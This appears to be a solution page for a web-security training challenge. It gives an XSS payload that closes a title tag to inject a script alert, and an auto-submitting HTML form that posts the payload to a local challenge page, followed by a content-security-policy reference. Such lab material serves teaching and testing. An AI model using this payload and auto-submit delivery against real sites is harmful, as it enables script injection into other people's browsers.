# Challenge 2
Solution and further references for *challenge 2*.

<details>
 <summary>Spoiler: Solution for challenge 2</summary>

**Payload**:
```html
</title><script>alert(document.domain)</script>
```

**Exploit**:
```html
<html>
  <body>
    <form action="http://127.0.0.1/challenge2.php" method="POST" id="attackForm">
      <input type="hidden" name="q" value="&lt;&#47;title&gt;&lt;script&gt;alert&#40;document&#46;domain&#41;&lt;&#47;script&gt;" />
      <input type="submit" value="Submit request" />
    </form>
  <script>attackForm.submit()</script>
  </body>
</html>
```
</details>

## References
Additional information:
* https://content-security-policy.com/examples/meta/